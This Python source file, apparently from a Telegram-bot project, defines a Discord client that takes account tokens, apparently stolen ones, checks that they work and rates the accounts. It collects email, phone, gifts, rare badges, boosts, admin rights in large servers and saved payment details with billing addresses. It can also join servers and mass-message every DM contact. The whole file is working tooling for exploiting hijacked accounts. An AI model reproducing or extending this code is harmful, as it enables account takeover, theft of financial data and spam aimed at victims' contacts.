import asyncio
import datetime
import logging
import random
import typing
from typing import Dict, Optional

import aiohttp
import pytz
from aiohttp.client_exceptions import ServerDisconnectedError

from dtb.settings import PROXY_SECONDS_TIMEOUT
from tgbot.handlers.sub_only.exceptions import AccountDisabledError, TimeoutTooLongError
from tgbot.handlers.sub_only.request_manager import RequestManager
from utils.discord_response import DiscordResponse
from proxy_manager.compound_throttler import CompoundThrottler
from proxy_manager.models import Proxy

logging.basicConfig(level=logging.INFO, format='[%(levelname)s] -- [%(name)s] -- [%(asctime)s] -- %(message)s')
logger = logging.getLogger(__name__)
logger.info('start dunno')


class DiscordApi:
    def __init__(self, token: str):
        self.token = token

        self.username = None
        self.id = None
        self.email = None
        self.phone = None
        self.rare_flags = None
        self.__cached_user_channels = None

        self.HEADERS = {
            "authorization": self.token,
            "content-type": "application/json",
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0'
        }

    async def validate(self) -> bool:
        """This will check if the discord token works"""
        url = f"https://discord.com/api/users/@me"
        try:
            r = await self.__async_request('get', url, headers=self.HEADERS)
        except TimeoutTooLongError:
            return False
        if r.status_code == 200:
            data = r.json()
            self.username = data['username'] + "#" + data['discriminator']
            self.id = data['id']
            self.email = data['email']
            self.phone = data['phone']
            self.rare_flags = self.__parse_rare_flags(r)
            return True
        return False

    async def __async_request(self, method, url, **kwargs) -> DiscordResponse:
        request_manager = RequestManager.get_instance()
        res = await request_manager.request(method, url, **kwargs)
        if issubclass(type(res), BaseException):
            raise res
        return res

    async def __get_gifts(self) -> list:
        """It will get all the gifts of the account"""
        url = f"https://discord.com/api/v8/users/@me/entitlements/gifts"
        r = await self.__async_request('get', url, headers=self.HEADERS)
        return r.json() if r.status_code == 200 else []

    async def __get_user_channels(self) -> list:
        """It will get all the dm of the account"""
        if self.__cached_user_channels:
            return self.__cached_user_channels
        url = f"https://discordapp.com/api/users/@me/channels"
        r = await self.__async_request('get', url, headers=self.HEADERS)
        if not r.ok():
            raise AccountDisabledError()
        self.__cached_user_channels = list(r.json())
        return self.__cached_user_channels

    async def __get_guilds(self) -> list:
        """It will get all the servers of the account"""
        url = "https://discord.com/api/users/@me/guilds"
        r = await self.__async_request('get', url, headers=self.HEADERS)
        return r.json() if r.status_code == 200 else []

    async def __join_server(self, invite_code: str) -> None:
        """It will join to a server"""
        invite_code = invite_code.replace("https://discord.gg/", "")
        url = f"https://discord.com/api/v9/invites/{invite_code}"
        r = await self.__async_request('post', url, headers=self.HEADERS)

    async def __send_message(self, msg: str, channel_id: str) -> None:
        """You can send a msg to whoever you want"""
        url = f"https://discord.com/api/channels/{channel_id}/messages"
        data = {"content": msg}
        r = await self.__async_request('post', url, headers=self.HEADERS, json=data)

    async def __send_mass_messages(self, msg: str) -> None:
        """It will send a msg to all the channels"""
        task_list = []
        for channel in await self.__get_user_channels():
            task_list.append(asyncio.create_task(self.__send_message(msg, channel['id'])))
        for i in task_list:
            await i

    async def __get_payments(self) -> list:
        """Checks if the account has payments methods"""
        payment_types = ["Credit Card", "Paypal"]
        url = "https://discord.com/api/users/@me/billing/payment-sources"
        r = await self.__async_request('get', url, headers=self.HEADERS)
        if r.status_code in [200, 201, 204]:
            payments = []
            for data in r.json():
                if int(data['type'] == 1):
                    payments.append({'type': payment_types[int(data['type']) - 1],
                                     'valid': not data['invalid'],
                                     'brand': data['brand'],
                                     'last 4': data['last_4'],
                                     'expires': str(data['expires_year']) + "y " + str(data['expires_month']) + 'm',
                                     'billing name': data['billing_address']['name'],
                                     'country': data['billing_address']['country'],
                                     'state': data['billing_address']['state'],
                                     'city': data['billing_address']['city'],
                                     'zip code': data['billing_address']['postal_code'],
                                     'address': data['billing_address']['line_1'], })
                else:
                    payments.append({'type': payment_types[int(data['type']) - 1],
                                     'valid': not data['invalid'],
                                     'email': data['email'], 'billing name': data['billing_address']['name'],
                                     'country': data['billing_address']['country'],
                                     'state': data['billing_address']['state'],
                                     'city': data['billing_address']['city'],
                                     'zip code': data['billing_address']['postal_code'],
                                     'address': data['billing_address']['line_1'], })
            return payments
        return []

    async def __get_messages(self, channel_id: str, page: int = 0) -> list:
        """It will get 25 messages from a channel"""
        offset = 25 * page
        url = f"https://discord.com/api/channels/{channel_id}/messages/search?offset={offset}"
        r = await self.__async_request('get', url, headers=self.HEADERS)
        if r.status_code in [200, 201, 204]:
            return r.json()["messages"]
        else:
            return []

    async def get_info(self) -> Optional[Dict[str, object]]:
        """It will return a dict with all the info about the account"""
        ready_info = {
            "token": self.token,
            "username": self.username,
            "id": self.id,
            "email": self.email,
            "phone": self.phone,
        }
        # starts all tasks at the same time
        try:
            info_awaitable_objects = {
                # "nitro": asyncio.create_task(self.get_nitro()),
                "gifts": asyncio.create_task(self.__get_gifts()),
                "payments": asyncio.create_task(self.__get_payments()),
                "has_admin_in_big_guilds": asyncio.create_task(self.__check_if_has_admin_in_big_guilds()),
                "rare_flags": asyncio.create_task(self.__get_rare_flags()),
                "has_unused_boosts": asyncio.create_task(self.__has_unused_boosts()),
                "dm_count": asyncio.create_task(self.__get_dm_count())
            }
            info = {}
            for k, v in info_awaitable_objects.items():
                # awaits all these tasks to finish
                info[k] = await v
        except (TimeoutTooLongError, AccountDisabledError):
            for i in info_awaitable_objects.values():
                try:
                    i.cancel()
                except Exception:
                    pass

            return None
        info.update(ready_info)
        info.update({'are_spammed_through': self.__check_if_spammed_through()})
        return info

    async def __check_if_has_admin_in_big_guilds(self) -> bool:
        admin_byte = 0x0000000008
        big_guild_member_count = 500
        for i in await self.__get_guilds():
            if int(i['permissions']) & admin_byte == admin_byte:
                url = f"https://discord.com/api/v9/guilds/{i['id']}/preview"
                r = await self.__async_request('GET', url, headers=self.HEADERS)
                if r.status_code in [200, 201, 204]:
                    if int(r.json()['approximate_member_count']) >= big_guild_member_count:
                        return True
        return False

    async def __get_rare_flags(self) -> list:
        if self.rare_flags:
            return self.rare_flags

        url = f"https://discord.com/api/users/@me"
        r = await self.__async_request('get', url, headers=self.HEADERS)
        self.rare_flags = self.__parse_rare_flags(r)
        return self.rare_flags

    @staticmethod
    def __parse_rare_flags(r):
        if r.status_code != 200:
            return []
        data = r.json()
        res = []
        badge_dict = {'discord_employee': 1 << 0, 'discord_partner': 1 << 1, 'hypesquad_events_coordinator': 1 << 2,
                      'bug_hunter_lvl1': 1 << 3, 'early_supporter': 1 << 9, 'bug_hunter_lvl2': 1 << 14,
                      'verified_developer': 1 << 17, 'certified_moderator': 1 << 18}
        for k, v in badge_dict.items():
            if int(data['flags']) & v == v:
                res.append(k)
        return res

    async def __has_unused_boosts(self) -> bool:
        """ returns true if user has unused boosts """
        url = f'https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots'
        r = await self.__async_request('get', url, headers=self.HEADERS)
        if r.status_code != 200:
            return False
        data = r.json()
        for i in data:
            if 'premium_guild_subscription' in i and \
                    (i['cooldown_ends_at'] is None or datetime.datetime.fromisoformat(
                        i['cooldown_ends_at']) <= datetime.datetime.now(tz=pytz.utc)):
                return True
        return False

    async def __get_dm_count(self):
        return len(await self.__get_user_channels())

    def __check_if_spammed_through(self):
        # checks last 4 channels of user
        return True
        # channel_list = self.__cached_user_channels[-25:]
        # for i in channel_list:
        #     pass
        # return False
